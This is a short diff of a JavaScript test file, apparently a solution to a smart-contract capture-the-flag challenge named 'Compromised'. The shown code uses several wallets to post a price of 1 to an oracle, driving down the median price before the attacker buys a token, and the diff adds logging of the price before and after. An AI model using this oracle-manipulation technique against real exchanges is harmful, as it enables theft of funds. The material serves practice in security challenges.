@@ -75,10 +75,16 @@ describe('Compromised challenge', function () {
             wallets.push(wallet);
         }
 
+        const startPrice = await this.oracle.getMedianPrice()
+        console.log(startPrice.toString())
+
         for (let i = 0; i < wallets.length; i++) {
 			await this.oracle.connect(wallets[i]).postPrice(tokenId, 1);
         }
+    
         console.log("price manipulated")
+        const afterPrice = await this.oracle.getMedianPrice()
+        console.log(afterPrice.toString())
 		await this.exchange.connect(attacker).buyOne();
         console.log("Bought one")
 		let exchangeBalance = this.exchange.balance;
